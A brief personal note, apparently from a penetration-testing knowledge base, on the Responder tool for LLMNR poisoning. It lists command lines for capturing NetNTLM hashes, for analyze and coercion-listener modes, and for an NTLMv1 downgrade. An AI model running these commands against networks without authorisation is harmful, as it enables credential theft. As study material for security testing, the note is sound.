---
tags:
  - windows
  - security
---
A tool for [[LLMNR Poisoning]].
Can capture [[New Technology LAN Manager|NetNTLM Hash]]
```
responder -I networkinterface
```
- Run in monitor mode
- Relay specific ip
# Example
```
responder -I eth0 -v
```
You can find these interface with `ip link` or [[ifconfig]]
# Analyze Mode
```
responder -I eth0 -A
```
# Coersion Listener
```
sudo responder -I eth0 -wbf
```
# NTLMv1 Downgrade
```
sudo responder -I eth0 --lm
```
# Responder Config
```
/etc/responder/Responder.conf
```